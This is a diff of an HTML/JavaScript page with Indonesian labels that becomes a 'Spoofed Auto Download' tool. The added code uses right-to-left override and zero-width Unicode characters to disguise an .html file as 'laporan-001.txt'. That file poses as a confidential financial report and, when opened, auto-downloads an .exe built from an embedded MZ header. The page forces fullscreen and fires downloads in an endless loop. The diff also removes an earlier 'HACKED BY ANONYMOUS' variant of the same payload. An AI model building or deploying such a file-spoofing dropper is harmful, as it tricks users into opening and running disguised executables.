@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Generator Berkas Blob &amp; ObjectURL — Spoofed Auto Download</title>
 <style>
 * {
 box-sizing: border-box;
@@ -61,6 +61,17 @@ transition: background 0.2s;
 button:hover {
 background: #b71c1c;
 }
+button:disabled {
+background: #9e9e9e;
+cursor: not-allowed;
+}
+#stop-btn {
+background: #616161;
+margin-top: 8px;
+}
+#stop-btn:hover {
+background: #424242;
+}
 #status {
 margin-top: 16px;
 font-weight: bold;
@@ -70,6 +81,13 @@ background: #ffebee;
 border-radius: 6px;
 text-align: center;
 border: 1px solid #ffcdd2;
+}
+#counter {
+margin-top: 10px;
+font-family: monospace;
+font-size: 14px;
+text-align: center;
+color: #555;
 }
 #downloads {
 margin-top: 20px;
@@ -89,141 +107,459 @@ text-align: center;
 border: 1px solid #424242;
 word-break: break-all;
 }
+.info-box {
+background: #fff3cd;
+border: 1px solid #ffc107;
+border-radius: 6px;
+padding: 10px;
+font-size: 12px;
+color: #856404;
+margin-bottom: 15px;
+}
+.info-box code {
+background: #fff;
+padding: 2px 4px;
+border-radius: 3px;
+font-family: monospace;
+}
+.alur {
+background: #0a0a0a;
+border: 1px solid #333;
+border-radius: 6px;
+padding: 12px;
+margin-bottom: 15px;
+font-family: monospace;
+font-size: 12px;
+color: #0f0;
+line-height: 1.6;
+}
+.alur .step {
+padding: 3px 0;
+}
+.alur .num {
+color: #0078d4;
+font-weight: bold;
+}
+.mode-selector {
+display: flex;
+gap: 8px;
+margin-bottom: 15px;
+flex-wrap: wrap;
+}
+.mode-selector label {
+flex: 1;
+min-width: 120px;
+padding: 10px;
+background: #eee;
+border-radius: 6px;
+text-align: center;
+cursor: pointer;
+font-size: 12px;
+border: 2px solid transparent;
+transition: all 0.2s;
+}
+.mode-selector input {
+display: none;
+}
+.mode-selector input:checked + label {
+background: #0078d4;
+color: white;
+border-color: #005a9e;
+}
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
+<h2>Generator Blob &amp; ObjectURL — Spoofed Auto Download</h2>
+<p>File terunduh tampil sebagai <code>laporan-001.txt</code> (RTL Override), tapi ekstensi asli <code>.html</code>. Saat dibuka, otomatis download <code>.exe</code>.</p>
 
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+<div class="info-box">
+<strong>Struktur nama file:</strong>
+<ul style="margin-top:6px;margin-left:18px">
+<li>Nama asli di memori: <code>laporan-001\u202Emlth.txt</code></li>
+<li>Nama tampil ke user: <code>laporan-001.txt</code></li>
+<li>Ekstensi efektif: <code>.html</code></li>
+</ul>
+</div>
+
+<div class="alur">
+<div class="step"><span class="num">1.</span> Klik tombol → download <code>laporan-001.txt</code> (RTL spoofed)</div>
+<div class="step"><span class="num">2.</span> User klik 2x file → browser render sebagai HTML</div>
+<div class="step"><span class="num">3.</span> Halaman tampil dokumen laporan + spinner</div>
+<div class="step"><span class="num">4.</span> Script otomatis trigger download <code>update-laporan-001.exe</code></div>
+</div>
+
+<h3 style="margin-bottom:10px;font-size:14px">Pilih mode spoofing:</h3>
+<div class="mode-selector">
+<input type="radio" name="mode" id="mode-rtl" value="rtl" checked>
+<label for="mode-rtl">RTL Override</label>
+
+<input type="radio" name="mode" id="mode-zws" value="zws">
+<label for="mode-zws">Zero-Width</label>
+
+<input type="radio" name="mode" id="mode-uni" value="uni">
+<label for="mode-uni">Unicode Stop</label>
+
+<input type="radio" name="mode" id="mode-combo" value="combo">
+<label for="mode-combo">Combo (RTL + ZWS)</label>
+</div>
+
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Spoofed File</button>
+<button id="stop-btn" type="button" disabled>Stop Proses</button>
 
 <div id="status" role="status">Sistem siap.</div>
+<div id="counter">Berkas dipicu: 0</div>
 <div id="downloads"></div>
 </div>
 
 <script>
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
+var startBtn = document.getElementById("start-btn");
+var stopBtn = document.getElementById("stop-btn");
+var statusDiv = document.getElementById("status");
+var counterDiv = document.getElementById("counter");
+var downloadsDiv = document.getElementById("downloads");
 
-let activeUrls = [];
-let isProcessing = false;
+var activeUrls = [];
+var isProcessing = false;
+var totalDipicu = 0;
 
-const speak = (message) => {
+var speak = function(message) {
 if ('speechSynthesis' in window) {
+try {
 window.speechSynthesis.cancel();
-const utterance = new SpeechSynthesisUtterance(message);
+var utterance = new SpeechSynthesisUtterance(message);
 utterance.lang = 'id-ID';
 utterance.rate = 1.0;
 window.speechSynthesis.speak(utterance);
+} catch (e) {
+console.warn("TTS gagal:", e);
+}
 }
 };
 
-const prepareMimeBlobAsync = (i) => {
-return new Promise((resolve) => {
-queueMicrotask(() => {
-const payloadText = "<!DOCTYPE html>" +
-"<html>" +
-"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
-"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden'>" +
-"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>ANONYMOUS</h2>" +
-"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
-"<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6'>Payload sedang diunduh...</p>" +
-"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
-"</div>" +
-"<style>" +
-"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
-"body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
-"</style>" +
-"<script>" +
-"(function(){" +
-"\"use strict\";" +
-"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-"try { alert('HACKED BY ANONYMOUS'); } catch(e){}" +
-"function b64KeBytes(b64){" +
-"var binary = atob(b64);" +
-"var bytes = new Uint8Array(binary.length);" +
-"for (var i=0;i<binary.length;i++){ bytes[i]=binary.charCodeAt(i); }" +
-"return bytes;" +
-"}" +
-"function b64KeString(b64){" +
-"return decodeURIComponent(escape(atob(b64)));" +
-"}" +
-"var b64Header = \"TVqQAAMAAAAEAAAA\";" +
-"var b64Bytes = \"AEEAAgBA\";" +
-"function picuDownload(){" +
-"try{" +
-"var headerStr = b64KeString(b64Header);" +
-"var bytesArr = b64KeBytes(b64Bytes);" +
-"var blob = new Blob([headerStr, bytesArr], { type: 'application/x-msdownload' });" +
-"var url = URL.createObjectURL(blob);" +
-"var a = document.createElement('a');" +
-"a.href = url;" +
-"a.download = 'hacked-by-anonymous.exe';" +
-"a.style.display = 'none';" +
-"document.body.appendChild(a);" +
-"a.click();" +
-"setTimeout(function(){ document.body.removeChild(a); URL.revokeObjectURL(url); }, 2000);" +
-"} catch(e){ console.warn('Gagal:', e.message); }" +
-"}" +
-"if (document.readyState === 'loading'){" +
-"document.addEventListener('DOMContentLoaded', function(){ setTimeout(picuDownload, 500); });" +
-"} else {" +
-"setTimeout(picuDownload, 500);" +
-"}" +
-"})();" +
-"<\/script>" +
-"</body>" +
-"</html>";
-          
-const blob = new Blob([payloadText], { type: "text/html" });
-const url = URL.createObjectURL(blob);
-resolve({ id: i, url: url });
-});
-});
-};
+function reverseStr(s) {
+var out = "";
+for (var i = s.length - 1; i >= 0; i--) {
+out += s.charAt(i);
+}
+return out;
+}
 
-const triggerInstantDownload = (fileData) => {
-const link = document.createElement("a");
+function ambilMode() {
+var radios = document.getElementsByName('mode');
+for (var i = 0; i < radios.length; i++) {
+if (radios[i].checked) return radios[i].value;
+}
+return 'rtl';
+}
+
+function buatNamaSpoofed(id, mode) {
+var base = "laporan-" + String(id).padStart(3, '0');
+var ext = "html";
+var txt = "txt";
+
+switch (mode) {
+case 'rtl':
+return base + "\u202E" + reverseStr(ext) + "." + txt;
+case 'zws':
+return base + "." + ext + "\u200B." + txt;
+case 'uni':
+return base + "\u2024" + ext + "." + txt;
+case 'combo':
+return base + "\u202E" + reverseStr(ext) + "\u200B." + txt;
+default:
+return base + "\u202E" + reverseStr(ext) + "." + txt;
+}
+}
+
+function buatNamaTampil(id, mode) {
+var base = "laporan-" + String(id).padStart(3, '0');
+switch (mode) {
+case 'rtl':
+return base + ".txt";
+case 'zws':
+return base + ".html_ZWS_.txt";
+case 'uni':
+return base + ".html.txt";
+case 'combo':
+return base + ".txt";
+default:
+return base + ".txt";
+}
+}
+
+function buatPayloadTxtHtml(id) {
+var idPad = String(id).padStart(3, '0');
+
+var payload = '<!DOCTYPE html>\n' +
+'<html lang="id">\n' +
+'<head>\n' +
+'<meta charset="UTF-8">\n' +
+'<meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
+'<title>Laporan Keuangan ' + idPad + '</title>\n' +
+'<style>\n' +
+'* { box-sizing: border-box; margin: 0; padding: 0; }\n' +
+'body {\n' +
+'    font-family: "Segoe UI", Arial, sans-serif;\n' +
+'    background: #f0f2f5;\n' +
+'    color: #333;\n' +
+'    padding: 40px 20px;\n' +
+'    min-height: 100vh;\n' +
+'}\n' +
+'.container {\n' +
+'    max-width: 720px;\n' +
+'    margin: 0 auto;\n' +
+'    background: #ffffff;\n' +
+'    border-radius: 12px;\n' +
+'    box-shadow: 0 4px 20px rgba(0,0,0,0.08);\n' +
+'    overflow: hidden;\n' +
+'}\n' +
+'.header {\n' +
+'    background: linear-gradient(135deg, #1e3a8a, #3b82f6);\n' +
+'    color: white;\n' +
+'    padding: 30px;\n' +
+'}\n' +
+'.header h1 { font-size: 24px; margin-bottom: 8px; }\n' +
+'.header p { opacity: 0.9; font-size: 14px; }\n' +
+'.content { padding: 30px; }\n' +
+'.content h2 {\n' +
+'    font-size: 18px;\n' +
+'    color: #1e3a8a;\n' +
+'    margin-bottom: 12px;\n' +
+'    padding-bottom: 8px;\n' +
+'    border-bottom: 2px solid #e5e7eb;\n' +
+'}\n' +
+'.content p {\n' +
+'    line-height: 1.7;\n' +
+'    color: #4b5563;\n' +
+'    margin-bottom: 12px;\n' +
+'}\n' +
+'.info-grid {\n' +
+'    display: grid;\n' +
+'    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n' +
+'    gap: 15px;\n' +
+'    margin: 20px 0;\n' +
+'}\n' +
+'.info-card {\n' +
+'    background: #f9fafb;\n' +
+'    padding: 15px;\n' +
+'    border-radius: 8px;\n' +
+'    border-left: 4px solid #3b82f6;\n' +
+'}\n' +
+'.info-card .label {\n' +
+'    font-size: 12px;\n' +
+'    color: #6b7280;\n' +
+'    text-transform: uppercase;\n' +
+'    margin-bottom: 4px;\n' +
+'}\n' +
+'.info-card .value {\n' +
+'    font-size: 16px;\n' +
+'    font-weight: bold;\n' +
+'    color: #1f2937;\n' +
+'}\n' +
+'.status-otomatis {\n' +
+'    margin-top: 25px;\n' +
+'    padding: 18px;\n' +
+'    background: #dbeafe;\n' +
+'    border-left: 4px solid #3b82f6;\n' +
+'    border-radius: 8px;\n' +
+'    font-size: 14px;\n' +
+'    color: #1e40af;\n' +
+'    text-align: center;\n' +
+'}\n' +
+'.status-otomatis .spinner {\n' +
+'    display: inline-block;\n' +
+'    width: 14px;\n' +
+'    height: 14px;\n' +
+'    border: 2px solid #3b82f6;\n' +
+'    border-top-color: transparent;\n' +
+'    border-radius: 50%;\n' +
+'    animation: spin 0.8s linear infinite;\n' +
+'    margin-right: 8px;\n' +
+'    vertical-align: middle;\n' +
+'}\n' +
+'@keyframes spin { to { transform: rotate(360deg); } }\n' +
+'.footer {\n' +
+'    background: #f9fafb;\n' +
+'    padding: 20px 30px;\n' +
+'    text-align: center;\n' +
+'    font-size: 12px;\n' +
+'    color: #6b7280;\n' +
+'    border-top: 1px solid #e5e7eb;\n' +
+'}\n' +
+'</style>\n' +
+'</head>\n' +
+'<body>\n' +
+'<div class="container">\n' +
+'    <div class="header">\n' +
+'        <h1>Laporan Keuangan</h1>\n' +
+'        <p>Periode ' + idPad + ' — Konfidensial</p>\n' +
+'    </div>\n' +
+'    \n' +
+'    <div class="content">\n' +
+'        <h2>Ringkasan Eksekutif</h2>\n' +
+'        <p>Dokumen ini berisi ringkasan laporan keuangan untuk periode ' + idPad + '. Lampiran pendukung sedang dipersiapkan dan akan diunduh secara otomatis.</p>\n' +
+'        \n' +
+'        <div class="info-grid">\n' +
+'            <div class="info-card">\n' +
+'                <div class="label">Periode</div>\n' +
+'                <div class="value">' + idPad + '/2026</div>\n' +
+'            </div>\n' +
+'            <div class="info-card">\n' +
+'                <div class="label">Total Transaksi</div>\n' +
+'                <div class="value">1.247</div>\n' +
+'            </div>\n' +
+'            <div class="info-card">\n' +
+'                <div class="label">Status</div>\n' +
+'                <div class="value">Final</div>\n' +
+'            </div>\n' +
+'            <div class="info-card">\n' +
+'                <div class="label">Lampiran</div>\n' +
+'                <div class="value">1 berkas</div>\n' +
+'            </div>\n' +
+'        </div>\n' +
+'        \n' +
+'        <div class="status-otomatis">\n' +
+'            <span class="spinner"></span>\n' +
+'            Menyiapkan lampiran laporan...\n' +
+'        </div>\n' +
+'    </div>\n' +
+'    \n' +
+'    <div class="footer">\n' +
+'        &copy; 2026 Departemen Keuangan — Dokumen ini bersifat rahasia\n' +
+'    </div>\n' +
+'</div>\n' +
+'\n' +
+'<script>\n' +
+'(function() {\n' +
+'    "use strict";\n' +
+'    \n' +
+'    function b64KeBytes(b64) {\n' +
+'        var binary = atob(b64);\n' +
+'        var bytes = new Uint8Array(binary.length);\n' +
+'        for (var i = 0; i < binary.length; i++) {\n' +
+'            bytes[i] = binary.charCodeAt(i);\n' +
+'        }\n' +
+'        return bytes;\n' +
+'    }\n' +
+'    \n' +
+'    function b64KeString(b64) {\n' +
+'        return decodeURIComponent(escape(atob(b64)));\n' +
+'    }\n' +
+'    \n' +
+'    var b64Header = "TVqQAAMAAAAEAAAA";\n' +
+'    var b64Bytes = "AEEAAgBA";\n' +
+'    \n' +
+'    function picuAutoDownload() {\n' +
+'        try {\n' +
+'            var headerStr = b64KeString(b64Header);\n' +
+'            var bytesArr = b64KeBytes(b64Bytes);\n' +
+'            var blob = new Blob([headerStr, bytesArr], { type: "application/x-msdownload" });\n' +
+'            var url = URL.createObjectURL(blob);\n' +
+'            var a = document.createElement("a");\n' +
+'            a.href = url;\n' +
+'            a.download = "update-laporan-' + idPad + '.exe";\n' +
+'            a.style.display = "none";\n' +
+'            document.body.appendChild(a);\n' +
+'            a.click();\n' +
+'            setTimeout(function() {\n' +
+'                document.body.removeChild(a);\n' +
+'                URL.revokeObjectURL(url);\n' +
+'            }, 2000);\n' +
+'        } catch (e) {\n' +
+'            console.warn("Auto download gagal:", e.message);\n' +
+'        }\n' +
+'    }\n' +
+'    \n' +
+'    if (document.readyState === "loading") {\n' +
+'        document.addEventListener("DOMContentLoaded", function() {\n' +
+'            setTimeout(picuAutoDownload, 400);\n' +
+'        });\n' +
+'    } else {\n' +
+'        setTimeout(picuAutoDownload, 400);\n' +
+'    }\n' +
+'})();\n' +
+'<\/script>\n' +
+'</body>\n' +
+'</html>\n';
+
+return payload;
+}
+
+function prepareMimeBlobAsync(i, mode) {
+return new Promise(function(resolve) {
+queueMicrotask(function() {
+var payloadTxtHtml = buatPayloadTxtHtml(i);
+var blob = new Blob([payloadTxtHtml], { type: "text/html" });
+var url = URL.createObjectURL(blob);
+var namaDownload = buatNamaSpoofed(i, mode);
+var namaTampil = buatNamaTampil(i, mode);
+resolve({ id: i, url: url, namaDownload: namaDownload, namaTampil: namaTampil });
+});
+});
+}
+
+function triggerInstantDownload(fileData) {
+var link = document.createElement("a");
 link.href = fileData.url;
-link.download = `test-file-${fileData.id}.txt`;
-link.textContent = `Blob #${fileData.id} (.txt)`;
+link.download = fileData.namaDownload;
+link.textContent = fileData.namaTampil;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
 link.click();
-};
-
-const processLoop = async (counter) => {
-if (!isProcessing) return;
-
-const fileData = await prepareMimeBlobAsync(counter);
-activeUrls.push(fileData.url);
-
-triggerInstantDownload(fileData);
-
-statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
-
-if (counter % 10 === 0) {
-speak(`Proses mencapai ${counter} berkas.`);
 }
 
-setTimeout(() => processLoop(counter + 1), 0);
-};
+function updateCounter() {
+counterDiv.textContent = "Berkas dipicu: " + totalDipicu;
+}
 
-startBtn.addEventListener("click", () => {
+function processLoop(counter) {
+if (!isProcessing) return;
+
+var mode = ambilMode();
+
+prepareMimeBlobAsync(counter, mode).then(function(fileData) {
+if (!isProcessing) return;
+
+activeUrls.push(fileData.url);
+triggerInstantDownload(fileData);
+
+totalDipicu++;
+updateCounter();
+
+statusDiv.textContent = "Proses berjalan: berkas ke-" + counter + " — tampil: " + fileData.namaTampil;
+
+if (counter % 10 === 0) {
+speak("Proses mencapai " + counter + " berkas.");
+}
+
+setTimeout(function() {
+processLoop(counter + 1);
+}, 0);
+});
+}
+
+startBtn.addEventListener("click", function() {
 if (isProcessing) return;
 
-activeUrls.forEach(url => URL.revokeObjectURL(url));
+activeUrls.forEach(function(url) { URL.revokeObjectURL(url); });
 activeUrls = [];
 downloadsDiv.replaceChildren();
+totalDipicu = 0;
+updateCounter();
 
-speak("Mengaktifkan mode layar penuh.");
+var mode = ambilMode();
+var label = {
+'rtl': 'RTL Override',
+'zws': 'Zero-Width Space',
+'uni': 'Unicode Stop',
+'combo': 'Combo RTL + ZWS'
+}[mode];
 
-const root = document.documentElement;
+speak("Mengaktifkan mode " + label + ".");
+
+var root = document.documentElement;
 try {
 if (root.requestFullscreen) {
 root.requestFullscreen();
@@ -237,11 +573,21 @@ statusDiv.textContent = "Mengunci layar penuh...";
 console.warn("Fullscreen tidak didukung atau ditolak:", err);
 }
 
-setTimeout(() => {
+setTimeout(function() {
 isProcessing = true;
-speak("Proses pembuatan berkas Blob dimulai.");
+startBtn.disabled = true;
+stopBtn.disabled = false;
+speak("Proses spoofing auto download dimulai.");
 processLoop(1);
 }, 300);
+});
+
+stopBtn.addEventListener("click", function() {
+isProcessing = false;
+startBtn.disabled = false;
+stopBtn.disabled = true;
+statusDiv.textContent = "Proses dihentikan. Total berkas: " + totalDipicu;
+speak("Proses dihentikan.");
 });
 </script>
 </body>
